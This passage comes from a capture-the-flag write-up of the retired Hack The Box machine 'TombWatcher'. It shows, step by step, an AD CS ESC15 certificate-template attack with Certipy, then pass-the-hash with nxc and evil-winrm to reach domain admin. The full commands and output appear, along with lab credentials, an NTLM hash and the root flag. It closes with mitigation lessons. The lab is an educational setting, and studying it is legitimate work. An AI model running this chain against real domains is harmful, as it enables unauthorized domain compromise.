### 🧪 Exploitation

The Certipy Wiki on GitHub (https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) explained step-by-step how to exploit ECS15.

I followed the steps.

**Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.**

```
fcoomans@kali:~/htb/tombwatcher$ certipy-ad req -u cert_admin@tombwatcher.htb -p Password123! -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

**Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.**

```
fcoomans@kali:~/htb/tombwatcher$ certipy-ad req -u cert_admin@tombwatcher.htb -p Password123! -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'TOMBWATCHER\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Step 3: Authenticate as the privileged user using the "on-behalf-of" certificate.**

```
fcoomans@kali:~/htb/tombwatcher$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

The last step retrieved the NTLM hash for the Administrator user.  NetExec (`nxc`) confirmed that the hash was indeed valid and `Pwn3d!` indicated that domain compromise was achieved.

```
fcoomans@kali:~/htb/tombwatcher$ nxc smb dc01.tombwatcher.htb -u Administrator -H aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\Administrator:f61db423bebe3328d33af26741afe5fc (Pwn3d!)
```

I used `evil-winrm` to connect to the target using the Administrator hash.  This is a technique known as Pass-the-Hash (PtH).

```
fcoomans@kali:~/htb/tombwatcher$ evil-winrm -i dc01.tombwatcher.htb -u Administrator -H f61db423bebe3328d33af26741afe5fc

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
```

### 💰 Post Exploitation

#### 🏆 root.txt

The Administrator user was the holder of the `root.txt` flag.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
17dd9e511eea2bd866fc63ff1bad1c0b
```

I pulled the right chains and raised a dead account — who knew pentesting included necromancy? 🔗🧟

And `TombWatcher has been Pwned!` 🎉

![](images/Pasted%20image%2020250718184829.png)

## 📚 Lessons Learned

- **Weak passwords:** Alfred’s weak password enabled the initial pivot. Enforce long, complex passwords for all accounts, rotate high‑value credentials, and monitor for unusual activity.
- **AD ACE abuse & Principle of Least Privilege (PoLP):** Small privileges stacked up: group membership, GMSA read, and password reset rights. Regularly review ACLs and enforce principle of least privilege. Audit changes to group memberships and permissions.
- **Tombstone restore rights:** John’s ability to restore deleted objects was a major escalation vector. Limit restore permissions, audit usage, and consider shortening tombstone retention or using secure deletion workflows.
- **AD CS — ESC15 vulnerability:** ESC15 allows abuse of vulnerable templates to obtain certificates for high‑privilege impersonation. Mitigations: patch AD CS servers, restrict template enrollment, clone v1 templates to v2, and monitor certificate requests.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
